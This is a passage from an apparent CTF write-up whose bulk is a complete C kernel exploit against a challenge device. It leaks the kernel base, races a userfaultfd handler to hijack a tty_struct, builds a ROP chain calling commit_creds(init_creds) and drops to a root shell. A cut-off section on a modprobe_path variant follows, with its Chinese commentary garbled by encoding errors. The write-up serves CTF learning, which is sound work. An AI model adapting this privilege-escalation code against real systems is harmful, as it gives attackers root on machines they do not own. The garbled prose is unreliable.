class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// musl-gcc exp.c --static -masm=intel -lpthread -idirafter /usr/include/ -idirafter /usr/include/x86_64-linux-gnu/ -o exp</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/utsname.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/if_packet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> modprobe_path = <span class="number">0xffffffff824493c0</span>;</span><br><span class="line"><span class="type">size_t</span> heap_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> work_for_cpu_fn = <span class="number">0xffffffff810bd960</span>;</span><br><span class="line"><span class="type">size_t</span> init_creds = <span class="number">0xffffffff82c6b920</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xffffffff810ce710</span>;</span><br><span class="line"><span class="type">size_t</span> fake_ops_addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> orignal[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">size_t</span> leak, kernel_base;</span><br><span class="line"><span class="type">size_t</span> gadget = <span class="number">0xffffffff817d1e76</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi;</span><br><span class="line"><span class="type">size_t</span> add_rsp_188_pop_rbx_ret;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00a74</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="type">char</span> *msg;</span><br><span class="line">    <span class="type">uint64_t</span> a;</span><br><span class="line">    <span class="type">uint64_t</span> b;</span><br><span class="line">    <span class="type">uint64_t</span> c;</span><br><span class="line">    <span class="type">uint64_t</span> d;</span><br><span class="line">    <span class="type">uint64_t</span> e;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> <span class="title">vuln</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span>&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">char</span> v14[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin add.&quot;</span>);</span><br><span class="line">    vuln.e = (<span class="type">size_t</span>)v14;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF0</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Add success.&quot;</span>);</span><br><span class="line">            heap_addr = *(<span class="type">size_t</span>*)vuln.e;</span><br><span class="line">            hexx(<span class="string">&quot;heap_addr&quot;</span>, heap_addr);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">del</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Begin delete&quot;</span>);</span><br><span class="line">    vuln.e = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">        <span class="type">int</span> result = ioctl(fd, <span class="number">0xFFF1</span>, &amp;vuln);</span><br><span class="line">        <span class="keyword">if</span>(result != <span class="number">-1</span>)&#123;</span><br><span class="line">            info(<span class="string">&quot;Delete success.&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">sem_t</span> sem_write, sem_free;</span><br><span class="line"><span class="type">size_t</span> payload[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> tty_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> uffd_buf[<span class="number">0x200</span>];</span><br><span class="line"><span class="type">void</span> <span class="title function_">register_userfaultfd</span><span class="params">(<span class="type">void</span>* uffd_buf, <span class="type">pthread_t</span> pthread_moniter, <span class="type">void</span>* handler)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line"> </span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_NONBLOCK|O_CLOEXEC);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>) err_exit(<span class="string">&quot;syscall for userfaultfd ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_API ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    uffdio_register.range.start = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)uffd_buf;</span><br><span class="line">    uffdio_register.range.len = <span class="number">0x1000</span>;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>) err_exit(<span class="string">&quot;ioctl for UFFDIO_REGISTER ERROR&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">int</span> res = pthread_create(&amp;pthread_moniter, <span class="literal">NULL</span>, handler, uffd);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="number">-1</span>) err_exit(<span class="string">&quot;pthread_create ERROR in register_userfaultfd func&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hijack_handler</span><span class="params">(<span class="type">void</span> *args)</span>&#123;</span><br><span class="line">    <span class="type">int</span> uffd = (<span class="type">int</span>)args;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        <span class="keyword">if</span> (poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec poll for leak_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> res = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;EOF on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (res == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;ERROR on userfaultfd for leak_handler&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            err_exit(<span class="string">&quot;INCORRET EVENT in leak_handler&quot;</span>);</span><br><span class="line">        <span class="comment">// operation</span></span><br><span class="line">        info(<span class="string">&quot;hijack the kernel in userfaultfd -- hijack_handler&quot;</span>);</span><br><span class="line">        del();</span><br><span class="line"></span><br><span class="line">        tty_fd = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        uffd_buf[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">        uffd_buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        uffd_buf[<span class="number">2</span>] = kernel_base + <span class="number">0x13e8030</span> - <span class="number">0x60</span>;</span><br><span class="line">        uffd_buf[<span class="number">3</span>] = fake_ops_addr + <span class="number">0x40</span>;</span><br><span class="line">        uffd_buf[<span class="number">4</span>] = commit_creds;</span><br><span class="line">        uffd_buf[<span class="number">5</span>] = init_creds;</span><br><span class="line">        uffd_buf[<span class="number">7</span>] = add_rsp_188_pop_rbx_ret;</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[0]&quot;</span>, uffd_buf[<span class="number">0</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[1]&quot;</span>, uffd_buf[<span class="number">1</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[2]&quot;</span>, uffd_buf[<span class="number">2</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[3]&quot;</span>, uffd_buf[<span class="number">3</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[4]&quot;</span>, uffd_buf[<span class="number">4</span>]);</span><br><span class="line">        hexx(<span class="string">&quot;uffd_buf[5]&quot;</span>, uffd_buf[<span class="number">5</span>]);</span><br><span class="line">        </span><br><span class="line">        uffdio_copy.src = uffd_buf;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>)msg.arg.pagefault.address &amp; ~(<span class="number">0x1000</span> - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = <span class="number">0x1000</span>;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">&quot;Failed to exec ioctl for UFFDIO_COPY in leak_handler&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> get_root_func = (<span class="type">size_t</span>)get_root_shell;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv, <span class="type">char</span>** env)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x200</span>];</span><br><span class="line"></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/ksctf&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open device failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> note_fd = open(<span class="string">&quot;/sys/kernel/notes&quot;</span>, O_RDONLY);</span><br><span class="line">    read(note_fd, data, <span class="number">0x100</span>);</span><br><span class="line">    binary_dump(<span class="string">&quot;/sys/kernel/notes&quot;</span>, data, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;leak, &amp;data[<span class="number">0x84</span>], <span class="number">8</span>);</span><br><span class="line">    hexx(<span class="string">&quot;leak&quot;</span>, leak);</span><br><span class="line">    kernel_base = leak - <span class="number">0x19e1180</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">    hexx(<span class="string">&quot;kernel_offset&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    modprobe_path += kernel_offset;</span><br><span class="line">    hexx(<span class="string">&quot;modprobe_path&quot;</span>, modprobe_path);</span><br><span class="line"></span><br><span class="line">    vuln.msg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">memset</span>(vuln.msg, <span class="string">&#x27;\x00&#x27;</span>, <span class="number">0x30</span>);</span><br><span class="line">    </span><br><span class="line">    work_for_cpu_fn  = kernel_base + <span class="number">0x8c360</span>;</span><br><span class="line">    init_creds = kernel_base + <span class="number">0x1448cc0</span>;</span><br><span class="line">    commit_creds = kernel_base + <span class="number">0x97d00</span>;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset + <span class="number">35</span>;</span><br><span class="line">    hexx(<span class="string">&quot;commit_creds&quot;</span>, commit_creds);</span><br><span class="line">    hexx(<span class="string">&quot;work_for_cpu_fn&quot;</span>, work_for_cpu_fn);</span><br><span class="line">    hexx(<span class="string">&quot;swapgs_restore_regs_and_return_to_usermode&quot;</span>, swapgs_restore_regs_and_return_to_usermode);</span><br><span class="line"></span><br><span class="line">    pop_rdi = kernel_base + <span class="number">0xe031</span>;</span><br><span class="line">    add_rsp_188_pop_rbx_ret = kernel_base + <span class="number">0x9369cc</span>;</span><br><span class="line">    hexx(<span class="string">&quot;add_rsp_188_pop_rbx_ret&quot;</span>,add_rsp_188_pop_rbx_ret);</span><br><span class="line"></span><br><span class="line">    add();</span><br><span class="line">    fake_ops_addr = heap_addr - <span class="number">0x68</span>;</span><br><span class="line">    hexx(<span class="string">&quot;fake_ops_addr&quot;</span>, fake_ops_addr);</span><br><span class="line"></span><br><span class="line">    <span class="type">pthread_t</span> pwn;</span><br><span class="line">    <span class="type">char</span> *uffd_buf_hijack = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    register_userfaultfd(uffd_buf_hijack, &amp;pwn, hijack_handler);</span><br><span class="line"></span><br><span class="line">    orignal[<span class="number">0</span>] = <span class="number">0x100005401</span>;</span><br><span class="line">    orignal[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    orignal[<span class="number">2</span>] = heap_addr - <span class="number">0x2a5540</span>;</span><br><span class="line">    orignal[<span class="number">3</span>] = kernel_base + <span class="number">0x1073e00</span>;</span><br><span class="line">    orignal[<span class="number">4</span>] = <span class="number">0</span>;</span><br><span class="line">    orignal[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line">    orignal[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    write(fd,uffd_buf_hijack,<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   pop_rdi;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   init_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   commit_creds;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,    user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax,   16;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   0xfffffe0000010f58;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   0xfffffe0000010f58;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   tty_fd;&quot;</span>        </span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    hexx(<span class="string">&quot;UID&quot;</span>, getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] EXP END.&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="notes-leak-userfaultfd-tty-struct-modprobe-path"><a href="#notes-leak-userfaultfd-tty-struct-modprobe-path" class="headerlink" title="notes leak + userfaultfd + tty_struct + modprobe_path"></a>notes leak + userfaultfd + tty_struct + modprobe_path</h2><h3 id="æ€è·¯åˆ†æ-1"><a href="#æ€è·¯åˆ†æ-1" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h3><p>å¥½ï¼Œæˆ‘è¿™ä¸ªäººæ¯”è¾ƒæ‡’ï¼Œä¸æƒ³è¿›è¡Œä¸¤æ¬¡æ ˆè¿ç§»ï¼Œè€Œä¸”ç°åœ¨å‡è®¾è¿™é“é¢˜ç›®çš„ pt_regs å¼€å¯äº†éšæœºåŒ–(<font style="color:rgb(44, 62, 80);">CONFIG_RANDOMIZE_KSTACK_OFFSET&#x3D;y</font>)ï¼Œæ¯æ¬¡åœ¨æ ˆä¸Šçš„åç§»éƒ½ä¸ä¸€æ ·ï¼Œè¿™ä¸ªæ—¶å€™å°±æœ‰è¯·æˆ‘ä»¬çš„ <code>modprobe_path</code> ç™»åœºäº†ã€‚åªè¦æˆ‘ä»¬èƒ½å¤Ÿä¿®æ”¹è¿™ä¸ªåœ°æ–¹çš„å€¼ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿå˜å‘çš„å°† <code>flag</code> 